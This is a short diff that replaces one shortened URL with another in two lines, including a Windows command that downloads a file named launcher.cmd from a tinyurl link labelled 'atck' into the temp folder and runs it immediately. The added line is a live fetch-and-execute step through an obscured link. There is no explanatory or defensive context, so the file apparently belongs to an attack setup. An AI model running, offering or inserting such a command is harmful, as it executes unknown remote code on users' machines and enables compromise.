@@ -1,4 +1,4 @@
-https://tinyurl.com/atck-hz
+https://tinyurl.com/atck-11
 
 
-curl -L -o %TEMP%\launcher.cmd https://tinyurl.com/atck-hz && %TEMP%\launcher.cmd
+curl -L -o %TEMP%\launcher.cmd https://tinyurl.com/atck-11 && %TEMP%\launcher.cmd
